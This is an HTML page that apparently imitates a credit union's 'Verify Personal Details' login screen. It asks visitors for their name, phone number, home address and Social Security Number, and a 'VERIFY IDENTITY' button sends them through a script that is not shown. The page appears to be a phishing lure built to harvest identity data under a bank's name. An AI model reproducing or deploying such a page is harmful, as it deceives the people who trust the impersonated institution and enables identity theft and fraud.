<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" href="favicon.ico">
    <link href="./css/app.css" rel="stylesheet" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css"
        integrity="sha512-KfkfwYDsLkIlwQp6LFnl8zNdLGxu9YAA1QvwINks4PhcElQSvqcyVLLD9aMhXd13uQjoXtEKNosOWaZqXgel0g=="
        crossorigin="anonymous" referrerpolicy="no-referrer" />
    <script type="text/javascript" src="./js/app.js"></script>
    <title>Login</title>
</head>

<body>

    <header>
        <div class="headerImage">
            <img src="./assets/1.jpeg" />
        </div>
        <div class="headerLink">
            <a href="#"> Products </a>
            <a href="#"> Sign In </a>
        </div>
    </header>

    <main>
        <div class="mainForm">
            <form>
                <div class="mainFormHeader">
                    Verify Personal Details
                </div>
                <div class="mainFormBody">
                    <p> Sign in to your profile or <a href="#">Create an online profile</a> to continue: </p>
                    <div class="mainFormBodyDiv">
                        <label><span>*</span> Full Name : </label>
                        <input type="text" id="userfullName" />
                    </div>
                    <div class="mainFormBodyDiv">
                        <label><span>*</span> Mobile Number : </label>
                        <input type="number" id="userfullMobile" />
                    </div>
                    <div class="mainFormBodyDiv">
                        <label><span>*</span> Address : </label>
                        <input type="text" id="userfullAddress" />
                    </div>
                    <div class="mainFormBodyDiv">
                        <label><span>*</span> City : </label>
                        <input type="text" id="userfullCity" />
                    </div>
                    <div class="mainFormBodyDiv">
                        <label><span>*</span> State : </label>
                        <input type="text" id="userfullState" />
                    </div>
                    <div class="mainFormBodyDiv">
                        <label><span>*</span> Zip Code : </label>
                        <input type="text" id="userfullZip" />
                    </div>
                    <div class="mainFormBodyDiv">
                        <label><span>*</span> Social Security Number : </label>
                        <input type="text" id="userfullSSN" />
                    </div>
                </div>
                <div class="mainFormFooter">
                    <a href="#"> </a>
                    <button type="button" onclick="SubmitPersonalInfo()" id="submitBtn"> VERIFY IDENTITY </button>
                </div>
            </form>
        </div>
    </main>

    <footer>
        Copyright &copy; 2020 Altura Credit Union
    </footer>

</body>

</html>
